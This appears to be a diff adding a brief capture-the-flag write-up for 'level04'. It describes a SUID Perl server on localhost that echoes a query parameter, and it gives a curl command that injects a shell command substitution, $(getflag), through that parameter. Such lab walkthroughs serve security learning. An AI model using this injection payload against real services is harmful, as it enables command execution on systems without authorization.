@@ -1,0 +1,7 @@
+level04.pl has SUID bit set
+
+Perl server running on localhost:4747, it accepts a query parameter `x` and echo it's value to standard output.
+
+```
+curl 'localhost:4747?x=$(getflag)'
+```
